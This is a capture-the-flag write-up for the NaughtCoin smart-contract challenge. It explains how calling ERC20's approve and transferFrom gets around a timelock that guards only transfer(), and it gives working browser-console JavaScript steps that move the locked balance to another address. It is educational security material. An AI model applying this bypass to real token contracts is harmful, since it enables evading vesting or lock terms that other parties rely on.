> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely?

The `NaughtCoin` contract we see inherits from OZ's `ERC20` contract and only implements its `transfer()` function. On contract creation, a 10 year `timeLock` is set in storage. `transfer()` is then given a modifier, `lockTokens()`, which requires that the `timeLock` has been met. How do we get around this?

If you've ever looked at ERC20 code before, you'd know that `transfer` isn't the only standard function used for transferring tokens. This is why the description points us to **eip-20** and the ERC20 standard - the solution is there.

The ERC20 standard has a function `transferFrom` which allows for a withdraw workflow to be triggered by a contract on a user's behalf. Let's use this to drain ourselves of `NaughtCoin`s!

## Solution
We can knock this whole thing out in our browser's console.

1. Grab our balance
```javascript
let totalBalance = await contract.balanceOf(player).then(balance => balance.toString())
// '1000000000000000000000000'
```
2. Check our allowance (this shows us how much we are allowed to have withdrawn)
```javascript
(await contract.allowance(player)).toString()
// '0'
```
3. Approve that we can transfer out our entire balance
```javascript
(await contract.approve(player, totalBalance)).toString()

(await contract.allowance(player)).toString()
// '1000000000000000000000000'
```
4. Now that we're approved for draining our funds, take a random wallet address and send it our Naught Coins
```javascript
let randomAddress = '0xc0ffee254729296a45a3885639AC7E10F9d54979'

(await contract.transferFrom(player, randomAddress, totalBalance)).toString()
```
5. Finally, check our balance to see we've emptied it and submit
```javascript
await contract.balanceOf(player).then(balance => balance.toString())
// '0'
```